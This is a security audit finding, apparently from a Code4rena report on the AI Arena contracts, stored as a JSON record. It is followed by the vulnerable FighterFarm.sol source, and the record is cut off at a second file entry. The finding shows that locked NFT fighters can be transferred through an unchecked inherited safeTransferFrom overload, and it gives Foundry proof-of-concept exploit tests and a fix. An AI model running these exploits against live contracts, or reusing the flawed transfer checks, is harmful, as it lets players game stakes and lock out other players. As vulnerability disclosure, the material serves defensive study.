{
  "Title": "[H-01] A locked fighter can be transferred; leads to game server unable to commit transactions, and unstoppable fighters",
  "Content": "\n`FighterFarm` contract implements restrictions on the transferability of fighters in functions [transferFrom()](https://github.com/code-423n4/2024-02-ai-arena/blob/70b73ce5acaf10bc331cf388d35e4edff88d4541/src/FighterFarm.sol#L338-L348) and [safeTransferFrom()](https://github.com/code-423n4/2024-02-ai-arena/blob/70b73ce5acaf10bc331cf388d35e4edff88d4541/src/FighterFarm.sol#L355-L365), via the call to function [\\_ableToTransfer()](https://github.com/code-423n4/2024-02-ai-arena/blob/70b73ce5acaf10bc331cf388d35e4edff88d4541/src/FighterFarm.sol#L539-L545). Unfortunately this approach doesn't cover all possible ways to transfer a fighter:  The `FighterFarm` contract inherits from OpenZeppelin's `ERC721` contract, which includes the public function [safeTransferFrom(..., data)](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ecd2ca2cd7cac116f7a37d0e474bbb3d7d5e1c4d/contracts/token/ERC721/ERC721.sol#L175-L183), i.e. the same as `safeTransferFrom()` but with the additional `data` parameter. This inherited function becomes available in the `GameItems` contract, and calling it allows us to circumvent the transferability restriction. As a result, a player will be able to transfer any of their fighters, irrespective of whether they are locked or not. Violation of such a basic system invariant leads to various kinds of impacts, including:\n\n*   The game server won't be able to commit some transactions;\n*   The transferred fighter becomes unstoppable (a transaction in which it loses can't be committed);\n*   The transferred fighter may be used as a \"poison pill\" to spoil another player, and prevent it from leaving the losing zone (a transaction in which it wins can't be committed).\n\nBoth of the last two impacts include the inability of the game server to commit certain transactions, so we illustrate both of the last two with PoCs, thus illustrating the first one as well.\n\n### Impact 1: A fighter becomes unstoppable, game server unable to commit\n\nIf a fighter wins a battle, [points are added](https://github.com/code-423n4/2024-02-ai-arena/blob/f2952187a8afc44ee6adc28769657717b498b7d4/src/RankedBattle.sol#L467) to [accumulatedPointsPerAddress mapping](https://github.com/code-423n4/2024-02-ai-arena/blob/f2952187a8afc44ee6adc28769657717b498b7d4/src/RankedBattle.sol#L113). When a fighter loses a battle, the reverse happens: [points are subtracted](https://github.com/code-423n4/2024-02-ai-arena/blob/f2952187a8afc44ee6adc28769657717b498b7d4/src/RankedBattle.sol#L486). If a fighter is transferred after it wins the battle to another address, `accumulatedPointsPerAddress` for the new address is empty, and thus the points can't be subtracted: **the game server transaction will be reverted**. By transferring the fighter to a new address after each battle, **the fighter becomes unstoppable**, as its accumulated points will only grow, and will never decrease.\n\n### Impact 2: Another fighter can't win, game server unable to commit\n\nIf a fighter loses a battle, funds are transferred from the amount at stake, to the stake-at risk, which is reflected in the [amountLost mapping](https://github.com/code-423n4/2024-02-ai-arena/blob/70b73ce5acaf10bc331cf388d35e4edff88d4541/src/StakeAtRisk.sol#L48-L49) of `StakeAtRisk` contract. If the fighter with stake-at-risk is transferred to another player, the invariant that `amountLost` reflects the lost amount per address is violated: after the transfer the second player has more stake-at-risk than before. A particular way to exploit this violation is demonstrated below: the transferred fighter may win a battle, which leads to [reducing amountLost](https://github.com/code-423n4/2024-02-ai-arena/blob/70b73ce5acaf10bc331cf388d35e4edff88d4541/src/StakeAtRisk.sol#L104) by the corresponding amount. Upon subsequent wins of the second player own fighters, this operation will underflow, leading to **the game server unable to commit transactions**, and **the player unable to exit the losing zone**. This effectively makes a fighter with the stake-at-risk a \"poison pill\".\n\n### Proof of Concept\n\n### Impact 1: A fighter becomes unstoppable, game server unable to commit\n\n<details>\n\n```diff\ndiff --git a/test/RankedBattle.t.sol b/test/RankedBattle.t.sol\nindex 6c5a1d7..dfaaad4 100644\n--- a/test/RankedBattle.t.sol\n+++ b/test/RankedBattle.t.sol\n@@ -465,6 +465,31 @@ contract RankedBattleTest is Test {\n         assertEq(unclaimedNRN, 5000 * 10 ** 18);\n     }\n \n+   /// @notice An exploit demonstrating that it's possible to transfer a staked fighter, and make it immortal!\n+    function testExploitTransferStakedFighterAndPlay() public {\n+        address player = vm.addr(3);\n+        address otherPlayer = vm.addr(4);\n+        _mintFromMergingPool(player);\n+        uint8 tokenId = 0;\n+        _fundUserWith4kNeuronByTreasury(player);\n+        vm.prank(player);\n+        _rankedBattleContract.stakeNRN(1 * 10 ** 18, tokenId);\n+        // The fighter wins one battle\n+        vm.prank(address(_GAME_SERVER_ADDRESS));\n+        _rankedBattleContract.updateBattleRecord(tokenId, 0, 0, 1500, true);\n+        // The player transfers the fighter to other player\n+        vm.prank(address(player));\n+        _fighterFarmContract.safeTransferFrom(player, otherPlayer, tokenId, \"\");\n+        assertEq(_fighterFarmContract.ownerOf(tokenId), otherPlayer);\n+        // The fighter can't lose\n+        vm.prank(address(_GAME_SERVER_ADDRESS));\n+        vm.expectRevert();\n+        _rankedBattleContract.updateBattleRecord(tokenId, 0, 2, 1500, true);\n+        // The fighter can only win: it's unstoppable!\n+        vm.prank(address(_GAME_SERVER_ADDRESS));\n+        _rankedBattleContract.updateBattleRecord(tokenId, 0, 0, 1500, true);\n+    }\n+\n     /*//////////////////////////////////////////////////////////////\n                                HELPERS\n     //////////////////////////////////////////////////////////////*/\n```\n\nPlace the PoC into `test/RankedBattle.t.sol`, and execute with\n\n    forge test --match-test testExploitTransferStakedFighterAndPlay\n\n</details>\n\n### Impact 2: Another fighter can't win, game server unable to commit\n\n<details>\n\n```diff\ndiff --git a/test/RankedBattle.t.sol b/test/RankedBattle.t.sol\nindex 6c5a1d7..196e3a0 100644\n--- a/test/RankedBattle.t.sol\n+++ b/test/RankedBattle.t.sol\n@@ -465,6 +465,62 @@ contract RankedBattleTest is Test {\n         assertEq(unclaimedNRN, 5000 * 10 ** 18);\n     }\n \n+/// @notice Prepare two players and two fighters\n+function preparePlayersAndFighters() public returns (address, address, uint8, uint8) {\n+    address player1 = vm.addr(3);\n+    _mintFromMergingPool(player1);\n+    uint8 fighter1 = 0;\n+    _fundUserWith4kNeuronByTreasury(player1);\n+    address player2 = vm.addr(4);\n+    _mintFromMergingPool(player2);\n+    uint8 fighter2 = 1;\n+    _fundUserWith4kNeuronByTreasury(player2);\n+    return (player1, player2, fighter1, fighter2);\n+}\n+\n+/// @notice An exploit demonstrating that it's possible to transfer a fighter with funds at stake\n+/// @notice After transferring the fighter, it wins the battle, \n+/// @notice and the second player can't exit from the stake-at-risk zone anymore.\n+function testExploitTransferStakeAtRiskFighterAndSpoilOtherPlayer() public {\n+    (address player1, address player2, uint8 fighter1, uint8 fighter2) = \n+        preparePlayersAndFighters();\n+    vm.prank(player1);\n+    _rankedBattleContract.stakeNRN(1_000 * 10 **18, fighter1);        \n+    vm.prank(player2);\n+    _rankedBattleContract.stakeNRN(1_000 * 10 **18, fighter2);        \n+    // Fighter1 loses a battle\n+    vm.prank(address(_GAME_SERVER_ADDRESS));\n+    _rankedBattleContract.updateBattleRecord(fighter1, 0, 2, 1500, true);\n+    assertEq(_rankedBattleContract.amountStaked(fighter1), 999 * 10 ** 18);\n+    // Fighter2 loses a battle\n+    vm.prank(address(_GAME_SERVER_ADDRESS));\n+    _rankedBattleContract.updateBattleRecord(fighter2, 0, 2, 1500, true);\n+    assertEq(_rankedBattleContract.amountStaked(fighter2), 999 * 10 ** 18);\n+\n+    // On the game server, player1 initiates a battle with fighter1,\n+    // then unstakes all remaining stake from fighter1, and transfers it\n+    vm.prank(address(player1));\n+    _rankedBattleContract.unstakeNRN(999 * 10 ** 18, fighter1);\n+    vm.prank(address(player1));\n+    _fighterFarmContract.safeTransferFrom(player1, player2, fighter1, \"\");\n+    assertEq(_fighterFarmContract.ownerOf(fighter1), player2);\n+    // Fighter1 wins a battle, and part of its stake-at-risk is derisked.\n+    vm.prank(address(_GAME_SERVER_ADDRESS));\n+    _rankedBattleContract.updateBattleRecord(fighter1, 0, 0, 1500, true);\n+    assertEq(_rankedBattleContract.amountStaked(fighter1), 1 * 10 ** 15);\n+    // Fighter2 wins a battle, but the records can't be updated, due to underflow!\n+    vm.expectRevert();\n+    vm.prank(address(_GAME_SERVER_ADDRESS));\n+    _rankedBattleContract.updateBattleRecord(fighter2, 0, 0, 1500, true);\n+    // Fighter2 can't ever exit from the losing zone in this round, but can lose battles\n+    vm.prank(address(_GAME_SERVER_ADDRESS));\n+    _rankedBattleContract.updateBattleRecord(fighter2, 0, 2, 1500, true);\n+    (uint32 wins, uint32 ties, uint32 losses) = _rankedBattleContract.getBattleRecord(fighter2);\n+    assertEq(wins, 0);\n+    assertEq(ties, 0);\n+    assertEq(losses, 2);\n+}\n+\n     /*//////////////////////////////////////////////////////////////\n                                HELPERS\n     //////////////////////////////////////////////////////////////*/\n```\n\nPlace the PoC into `test/RankedBattle.t.sol`, and execute with\n\n    forge test --match-test testExploitTransferStakeAtRiskFighterAndSpoilOtherPlayer\n\n</details>\n\n### Recommended Mitigation Steps\n\nRemove the incomplete checks in the inherited functions `transferFrom()` and `safeTransferFrom()` of `FighterFarm` contract, and instead to enforce the transferability restriction via the `_beforeTokenTransfer()` hook, which applies equally to all token transfers, as illustrated below.\n\n<Details>\n\n```diff\ndiff --git a/src/FighterFarm.sol b/src/FighterFarm.sol\nindex 06ee3e6..9f9ac54 100644\n--- a/src/FighterFarm.sol\n+++ b/src/FighterFarm.sol\n@@ -330,40 +330,6 @@ contract FighterFarm is ERC721, ERC721Enumerable {\n         );\n     }\n \n-    /// @notice Transfer NFT ownership from one address to another.\n-    /// @dev Add a custom check for an ability to transfer the fighter.\n-    /// @param from Address of the current owner.\n-    /// @param to Address of the new owner.\n-    /// @param tokenId ID of the fighter being transferred.\n-    function transferFrom(\n-        address from, \n-        address to, \n-        uint256 tokenId\n-    ) \n-        public \n-        override(ERC721, IERC721)\n-    {\n-        require(_ableToTransfer(tokenId, to));\n-        _transfer(from, to, tokenId);\n-    }\n-\n-    /// @notice Safely transfers an NFT from one address to another.\n-    /// @dev Add a custom check for an ability to transfer the fighter.\n-    /// @param from Address of the current owner.\n-    /// @param to Address of the new owner.\n-    /// @param tokenId ID of the fighter being transferred.\n-    function safeTransferFrom(\n-        address from, \n-        address to, \n-        uint256 tokenId\n-    ) \n-        public \n-        override(ERC721, IERC721)\n-    {\n-        require(_ableToTransfer(tokenId, to));\n-        _safeTransfer(from, to, tokenId, \"\");\n-    }\n-\n     /// @notice Rolls a new fighter with random traits.\n     /// @param tokenId ID of the fighter being re-rolled.\n     /// @param fighterType The fighter type.\n@@ -448,7 +414,9 @@ contract FighterFarm is ERC721, ERC721Enumerable {\n         internal\n         override(ERC721, ERC721Enumerable)\n     {\n-        super._beforeTokenTransfer(from, to, tokenId);\n+        if(from != address(0) && to != address(0))\n+            require(_ableToTransfer(tokenId, to));\n+        super._beforeTokenTransfer(from, to , tokenId);\n     }\n \n     /*//////////////////////////////////////////////////////////////\n```\n\n</details>\n\n**[brandinho (AI Arena) confirmed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1709#issuecomment-2004609055)**\n\n**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**\n> Fixed safeTransferFrom override with data.<br>\n> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/2\n\n**Status:** Mitigation confirmed. Full details in reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/9), [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/41), and [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/6).\n\n\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2024-02-ai-arena",
  "Code": [
    {
      "filename": "src/FighterFarm.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity >=0.8.0 <0.9.0;\n\nimport { FighterOps } from \"./FighterOps.sol\";\nimport { Verification } from \"./Verification.sol\";\nimport { AAMintPass } from \"./AAMintPass.sol\";\nimport { AiArenaHelper } from \"./AiArenaHelper.sol\";\nimport { Neuron } from \"./Neuron.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol\";\n\n/// @title AI Arena Fighter NFT\n/// @author ArenaX Labs Inc.\n/// @notice This contract manages the creation, ownership, and redemption of AI Arena Fighter NFTs,\n/// including the ability to mint new NFTs from a merging pool or through the redemption of mint passes.\ncontract FighterFarm is ERC721, ERC721Enumerable {\n\n    /*//////////////////////////////////////////////////////////////\n                                EVENTS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Event emitted when a fighter is locked and thus cannot be traded.\n    event Locked(uint256 tokenId);\n\n    /// @notice Event emitted when a fighter is unlocked and can be traded.\n    event Unlocked(uint256 tokenId);\n\n    /*//////////////////////////////////////////////////////////////\n                            STATE VARIABLES\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice The maximum amount of fighters owned by an address.\n    uint8 public constant MAX_FIGHTERS_ALLOWED = 10;\n\n    /// @notice The maximum amount of rerolls for each fighter.\n    uint8[2] public maxRerollsAllowed = [3, 3];\n\n    /// @notice The cost ($NRN) to reroll a fighter.\n    uint256 public rerollCost = 1000 * 10**18;    \n\n    /// @notice Stores the current generation for each fighter type.\n    uint8[2] public generation = [0, 0];\n\n    /// @notice Aggregate number of training sessions recorded.\n    uint32 public totalNumTrained;\n\n    /// @notice The address of treasury.\n    address public treasuryAddress;\n\n    /// The address that has owner privileges (initially the contract deployer).\n    address _ownerAddress;\n\n    /// The address responsible for setting token URIs and signing fighter claim messages.\n    address _delegatedAddress;\n\n    /// The address of the Merging Pool contract.\n    address _mergingPoolAddress;\n\n    /// @dev Instance of the AI Arena Helper contract.\n    AiArenaHelper _aiArenaHelperInstance;\n\n    /// @dev Instance of the AI Arena Mintpass contract (ERC721).\n    AAMintPass _mintpassInstance;\n\n    /// @dev Instance of the Neuron contract (ERC20).\n    Neuron _neuronInstance;\n\n    /// @notice List of all fighter structs, accessible by using tokenId as index.\n    FighterOps.Fighter[] public fighters;\n\n    /*//////////////////////////////////////////////////////////////\n                                MAPPINGS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Mapping to keep track of whether a tokenId has staked or not.\n    mapping(uint256 => bool) public fighterStaked;\n\n    /// @notice Mapping to keep track of how many times an nft has been re-rolled.\n    mapping(uint256 => uint8) public numRerolls;\n\n    /// @notice Mapping to indicate which addresses are able to stake fighters.\n    mapping(address => bool) public hasStakerRole;\n\n    /// @notice Mapping of number elements by generation.\n    mapping(uint8 => uint8) public numElements;\n\n    /// @notice Maps address to fighter type to return the number of NFTs claimed.\n    mapping(address => mapping(uint8 => uint8)) public nftsClaimed;\n\n    /// @notice Mapping of tokenId to number of times trained.\n    mapping(uint256 => uint32) public numTrained;\n\n    /// @notice Mapping to keep track of tokenIds and their URI.\n    mapping(uint256 => string) private _tokenURIs;\n\n    /*//////////////////////////////////////////////////////////////\n                               CONSTRUCTOR\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Sets the owner address, the delegated address.\n    /// @param ownerAddress Address of contract deployer.\n    /// @param delegatedAddress Address of delegated signer for messages.\n    /// @param treasuryAddress_ Community treasury address.\n    constructor(address ownerAddress, address delegatedAddress, address treasuryAddress_)\n        ERC721(\"AI Arena Fighter\", \"FTR\")\n    {\n        _ownerAddress = ownerAddress;\n        _delegatedAddress = delegatedAddress;\n        treasuryAddress = treasuryAddress_;\n        numElements[0] = 3;\n    } \n\n    /*//////////////////////////////////////////////////////////////\n                            EXTERNAL FUNCTIONS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Transfers ownership from one address to another.\n    /// @dev Only the owner address is authorized to call this function.\n    /// @param newOwnerAddress The address of the new owner\n    function transferOwnership(address newOwnerAddress) external {\n        require(msg.sender == _ownerAddress);\n        _ownerAddress = newOwnerAddress;\n    }\n\n    /// @notice Increase the generation of the specified fighter type.\n    /// @dev Only the owner address is authorized to call this function.\n    /// @param fighterType Type of fighter either 0 or 1 (champion or dendroid).\n    /// @return Generation count of the fighter type.\n    function incrementGeneration(uint8 fighterType) external returns (uint8) {\n        require(msg.sender == _ownerAddress);\n        generation[fighterType] += 1;\n        maxRerollsAllowed[fighterType] += 1;\n        return generation[fighterType];\n    }\n\n    /// @notice Adds a new address that is allowed to stake fighters on behalf of users.\n    /// @dev Only the owner address is authorized to call this function.\n    /// @param newStaker The address of the new staker\n    function addStaker(address newStaker) external {\n        require(msg.sender == _ownerAddress);\n        hasStakerRole[newStaker] = true;\n    }\n\n    /// @notice Instantiates the ai arena helper contract.\n    /// @dev Only the owner address is authorized to call this function.\n    /// @param aiArenaHelperAddress Address of new helper contract.\n    function instantiateAIArenaHelperContract(address aiArenaHelperAddress) external {\n        require(msg.sender == _ownerAddress);\n        _aiArenaHelperInstance = AiArenaHelper(aiArenaHelperAddress);\n    }\n\n    /// @notice Instantiates the mint pass contract.\n    /// @dev Only the owner address is authorized to call this function.\n    /// @param mintpassAddress The address of the new AAMintPass contract instance.\n    function instantiateMintpassContract(address mintpassAddress) external {\n        require(msg.sender == _ownerAddress);\n        _mintpassInstance = AAMintPass(mintpassAddress);\n    }\n\n    /// @notice Instantiates the neuron contract.\n    /// @dev Only the owner address is authorized to call this function.\n    /// @param neuronAddress The address of the new Neuron contract instance.\n    function instantiateNeuronContract(address neuronAddress) external {\n        require(msg.sender == _ownerAddress);\n        _neuronInstance = Neuron(neuronAddress);\n    }\n\n    /// @notice Sets the merging pool contract address.\n    /// @dev Only the owner address is authorized to call this function.\n    /// @param mergingPoolAddress Address of the new Merging Pool contract.\n    function setMergingPoolAddress(address mergingPoolAddress) external {\n        require(msg.sender == _ownerAddress);\n        _mergingPoolAddress = mergingPoolAddress;\n    }\n\n    /// @notice Sets the tokenURI for the given tokenId.\n    /// @dev Only the delegated address is authorized to call this function.\n    /// @param tokenId The ID of the token to set the URI for.\n    /// @param newTokenURI The new URI to set for the given token.\n    function setTokenURI(uint256 tokenId, string calldata newTokenURI) external {\n        require(msg.sender == _delegatedAddress);\n        _tokenURIs[tokenId] = newTokenURI;\n    }\n\n    /// @notice Enables users to claim a pre-determined number of fighters. \n    /// @dev The function verifies the message signature is from the delegated address.\n    /// @param numToMint Array specifying the number of fighters to be claimed for each fighter type.\n    /// @param signature Signature of the claim message.\n    /// @param modelHashes Array of hashes representing the machine learning models for each fighter.\n    /// @param modelTypes Array of machine learning model types for each fighter.\n    function claimFighters(\n        uint8[2] calldata numToMint,\n        bytes calldata signature,\n        string[] calldata modelHashes,\n        string[] calldata modelTypes\n    ) \n        external \n    {\n        bytes32 msgHash = bytes32(keccak256(abi.encode(\n            msg.sender, \n            numToMint[0], \n            numToMint[1],\n            nftsClaimed[msg.sender][0],\n            nftsClaimed[msg.sender][1]\n        )));\n        require(Verification.verify(msgHash, signature, _delegatedAddress));\n        uint16 totalToMint = uint16(numToMint[0] + numToMint[1]);\n        require(modelHashes.length == totalToMint && modelTypes.length == totalToMint);\n        nftsClaimed[msg.sender][0] += numToMint[0];\n        nftsClaimed[msg.sender][1] += numToMint[1];\n        for (uint16 i = 0; i < totalToMint; i++) {\n            _createNewFighter(\n                msg.sender, \n                uint256(keccak256(abi.encode(msg.sender, fighters.length))),\n                modelHashes[i], \n                modelTypes[i],\n                i < numToMint[0] ? 0 : 1,\n                0,\n                [uint256(100), uint256(100)]\n            );\n        }\n    }\n\n    /// @notice Burns multiple mint passes in exchange for fighter NFTs.\n    /// @dev This function requires the length of all input arrays to be equal.\n    /// @dev Each input array must correspond to the same index, i.e., the first element in each \n    /// array belongs to the same mint pass, and so on.\n    /// @param mintpassIdsToBurn Array of mint pass IDs to be burned for each fighter to be minted.\n    /// @param mintPassDnas Array of DNA strings of the mint passes to be minted as fighters.\n    /// @param fighterTypes Array of fighter types corresponding to the fighters being minted.\n    /// @param modelHashes Array of ML model hashes corresponding to the fighters being minted. \n    /// @param modelTypes Array of ML model types corresponding to the fighters being minted.\n    function redeemMintPass(\n        uint256[] calldata mintpassIdsToBurn,\n        uint8[] calldata fighterTypes,\n        uint8[] calldata iconsTypes,\n        string[] calldata mintPassDnas,\n        string[] calldata modelHashes,\n        string[] calldata modelTypes\n    ) \n        external \n    {\n        require(\n            mintpassIdsToBurn.length == mintPassDnas.length && \n            mintPassDnas.length == fighterTypes.length && \n            fighterTypes.length == modelHashes.length &&\n            modelHashes.length == modelTypes.length\n        );\n        for (uint16 i = 0; i < mintpassIdsToBurn.length; i++) {\n            require(msg.sender == _mintpassInstance.ownerOf(mintpassIdsToBurn[i]));\n            _mintpassInstance.burn(mintpassIdsToBurn[i]);\n            _createNewFighter(\n                msg.sender, \n                uint256(keccak256(abi.encode(mintPassDnas[i]))), \n                modelHashes[i], \n                modelTypes[i],\n                fighterTypes[i],\n                iconsTypes[i],\n                [uint256(100), uint256(100)]\n            );\n        }\n    }\n\n    /// @notice Update the staking status of the fighter associated with the given token ID.\n    /// @dev Only addresses which have the staker role are authorized to call this function.\n    /// @param tokenId The ID of the fighter to update the staking status for.\n    /// @param stakingStatus The new staking status to set for the fighter.\n    function updateFighterStaking(uint256 tokenId, bool stakingStatus) external {\n        require(hasStakerRole[msg.sender]);\n        fighterStaked[tokenId] = stakingStatus;\n        if (stakingStatus) {\n            emit Locked(tokenId);\n        } else {\n            emit Unlocked(tokenId);\n        }\n    }\n\n    /// @notice Update the model for a token ID.\n    /// @dev Only the owner of the fighter can call this function.\n    /// @param tokenId The ID of the fighter to update the model for.\n    /// @param modelHash The hash of the machine learning model.\n    /// @param modelType The type of machine learning model.\n    function updateModel(\n        uint256 tokenId, \n        string calldata modelHash,\n        string calldata modelType\n    ) \n        external\n    {\n        require(msg.sender == ownerOf(tokenId));\n        fighters[tokenId].modelHash = modelHash;\n        fighters[tokenId].modelType = modelType;\n        numTrained[tokenId] += 1;\n        totalNumTrained += 1;\n    }\n\n    /// @notice Checks whether the given token ID exists.\n    /// @param tokenId The ID of the fighter to check for existence.\n    function doesTokenExist(uint256 tokenId) external view returns (bool) {\n        return _exists(tokenId);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            PUBLIC FUNCTIONS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Mints a new fighter from the merging pool.\n    /// @dev Only the merging pool contract address is authorized to call this function.\n    /// @param to The address that the new fighter will be assigned to.\n    /// @param modelHash The hash of the ML model associated with the fighter.\n    /// @param modelType The type of the ML model associated with the fighter.\n    /// @param customAttributes Array with [element, weight] of the newly created fighter.\n    function mintFromMergingPool(\n        address to, \n        string calldata modelHash, \n        string calldata modelType, \n        uint256[2] calldata customAttributes\n    ) \n        public \n    {\n        require(msg.sender == _mergingPoolAddress);\n        _createNewFighter(\n            to, \n            uint256(keccak256(abi.encode(msg.sender, fighters.length))), \n            modelHash, \n            modelType,\n            0,\n            0,\n            customAttributes\n        );\n    }\n\n    /// @notice Transfer NFT ownership from one address to another.\n    /// @dev Add a custom check for an ability to transfer the fighter.\n    /// @param from Address of the current owner.\n    /// @param to Address of the new owner.\n    /// @param tokenId ID of the fighter being transferred.\n    function transferFrom(\n        address from, \n        address to, \n        uint256 tokenId\n    ) \n        public \n        override(ERC721, IERC721)\n    {\n        require(_ableToTransfer(tokenId, to));\n        _transfer(from, to, tokenId);\n    }\n\n    /// @notice Safely transfers an NFT from one address to another.\n    /// @dev Add a custom check for an ability to transfer the fighter.\n    /// @param from Address of the current owner.\n    /// @param to Address of the new owner.\n    /// @param tokenId ID of the fighter being transferred.\n    function safeTransferFrom(\n        address from, \n        address to, \n        uint256 tokenId\n    ) \n        public \n        override(ERC721, IERC721)\n    {\n        require(_ableToTransfer(tokenId, to));\n        _safeTransfer(from, to, tokenId, \"\");\n    }\n\n    /// @notice Rolls a new fighter with random traits.\n    /// @param tokenId ID of the fighter being re-rolled.\n    /// @param fighterType The fighter type.\n    function reRoll(uint8 tokenId, uint8 fighterType) public {\n        require(msg.sender == ownerOf(tokenId));\n        require(numRerolls[tokenId] < maxRerollsAllowed[fighterType]);\n        require(_neuronInstance.balanceOf(msg.sender) >= rerollCost, \"Not enough NRN for reroll\");\n\n        _neuronInstance.approveSpender(msg.sender, rerollCost);\n        bool success = _neuronInstance.transferFrom(msg.sender, treasuryAddress, rerollCost);\n        if (success) {\n            numRerolls[tokenId] += 1;\n            uint256 dna = uint256(keccak256(abi.encode(msg.sender, tokenId, numRerolls[tokenId])));\n            (uint256 element, uint256 weight, uint256 newDna) = _createFighterBase(dna, fighterType);\n            fighters[tokenId].element = element;\n            fighters[tokenId].weight = weight;\n            fighters[tokenId].physicalAttributes = _aiArenaHelperInstance.createPhysicalAttributes(\n                newDna,\n                generation[fighterType],\n                fighters[tokenId].iconsType,\n                fighters[tokenId].dendroidBool\n            );\n            _tokenURIs[tokenId] = \"\";\n        }\n    }    \n\n    /// @notice Returns the URI where the contract metadata is stored.\n    /// @return URI where the contract metadata is stored.\n    function contractURI() public pure returns (string memory) {\n        return \"ipfs://bafybeifztjs4yuwhqi7bvzhw2ufksynkoiwxss2gnti6j4v25l7iwz7y44\";\n    }\n\n    /// @notice Returns the URI where the token metadata is stored.\n    /// @param tokenId The ID of the fighter.\n    /// @return URI where the token metadata is stored.\n    function tokenURI(uint256 tokenId) public view override(ERC721) returns (string memory) {\n        return _tokenURIs[tokenId];\n    }\n\n    /// @notice Returns whether a given interface is supported by this contract.\n    /// @dev Calls ERC721.supportsInterface.\n    /// @param _interfaceId The interface ID.\n    /// @return Bool whether the interface is supported by this contract.\n    function supportsInterface(bytes4 _interfaceId)\n        public\n        view\n        override(ERC721, ERC721Enumerable)\n        returns (bool)\n    {\n        return super.supportsInterface(_interfaceId);\n    }\n\n    /// @notice Returns all information related to the specified fighter token ID.\n    /// @param tokenId The unique identifier for the fighter token.\n    function getAllFighterInfo(\n        uint256 tokenId\n    )\n        public\n        view\n        returns (\n            address,\n            uint256[6] memory,\n            uint256,\n            uint256,\n            string memory,\n            string memory,\n            uint16\n        )\n    {\n        return FighterOps.viewFighterInfo(fighters[tokenId], ownerOf(tokenId));\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            INTERNAL FUNCTIONS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Hook that is called before a token transfer.\n    /// @param from The address transferring the token.\n    /// @param to The address receiving the token.\n    /// @param tokenId The ID of the NFT being transferred.\n    function _beforeTokenTransfer(address from, address to, uint256 tokenId)\n        internal\n        override(ERC721, ERC721Enumerable)\n    {\n        super._beforeTokenTransfer(from, to, tokenId);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            PRIVATE FUNCTIONS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Creates the base attributes for the fighter.\n    /// @param dna The dna of the fighter.\n    /// @param fighterType The type of the fighter.\n    /// @return Attributes of the new fighter: element, weight, and dna.\n    function _createFighterBase(\n        uint256 dna, \n        uint8 fighterType\n    ) \n        private \n        view \n        returns (uint256, uint256, uint256) \n    {\n        uint256 element = dna % numElements[generation[fighterType]];\n        uint256 weight = dna % 31 + 65;\n        uint256 newDna = fighterType == 0 ? dna : uint256(fighterType);\n        return (element, weight, newDna);\n    }\n\n    /// @notice Creates a new fighter and mints an NFT to the specified address.\n    /// @param to The address to mint the new NFT to.\n    /// @param dna The DNA of the new fighter.\n    /// @param modelHash The hash of the ML model.\n    /// @param modelType The type of the ML model.\n    /// @param fighterType The type of fighter to create.\n    /// @param iconsType Type of icons fighter (0 means it's not an icon).\n    /// @param customAttributes Array with [element, weight] of the newly created fighter.\n    function _createNewFighter(\n        address to, \n        uint256 dna, \n        string memory modelHash,\n        string memory modelType, \n        uint8 fighterType,\n        uint8 iconsType,\n        uint256[2] memory customAttributes\n    ) \n        private \n    {  \n        require(balanceOf(to) < MAX_FIGHTERS_ALLOWED);\n        uint256 element; \n        uint256 weight;\n        uint256 newDna;\n        if (customAttributes[0] == 100) {\n            (element, weight, newDna) = _createFighterBase(dna, fighterType);\n        }\n        else {\n            element = customAttributes[0];\n            weight = customAttributes[1];\n            newDna = dna;\n        }\n        uint256 newId = fighters.length;\n\n        bool dendroidBool = fighterType == 1;\n        FighterOps.FighterPhysicalAttributes memory attrs = _aiArenaHelperInstance.createPhysicalAttributes(\n            newDna,\n            generation[fighterType],\n            iconsType,\n            dendroidBool\n        );\n        fighters.push(\n            FighterOps.Fighter(\n                weight,\n                element,\n                attrs,\n                newId,\n                modelHash,\n                modelType,\n                generation[fighterType],\n                iconsType,\n                dendroidBool\n            )\n        );\n        _safeMint(to, newId);\n        FighterOps.fighterCreatedEmitter(newId, weight, element, generation[fighterType]);\n    }\n\n    /// @notice Check if the transfer of a specific token is allowed.\n    /// @dev Cannot receive another fighter if the user already has the maximum amount.\n    /// @dev Additionally, users cannot trade fighters that are currently staked.\n    /// @param tokenId The token ID of the fighter being transferred.\n    /// @param to The address of the receiver.\n    /// @return Bool whether the transfer is allowed or not.\n    function _ableToTransfer(uint256 tokenId, address to) private view returns(bool) {\n        return (\n          _isApprovedOrOwner(msg.sender, tokenId) &&\n          balanceOf(to) < MAX_FIGHTERS_ALLOWED &&\n          !fighterStaked[tokenId]\n        );\n    }\n}"
    },
    {
      "filename": "src/RankedBattle.sol",
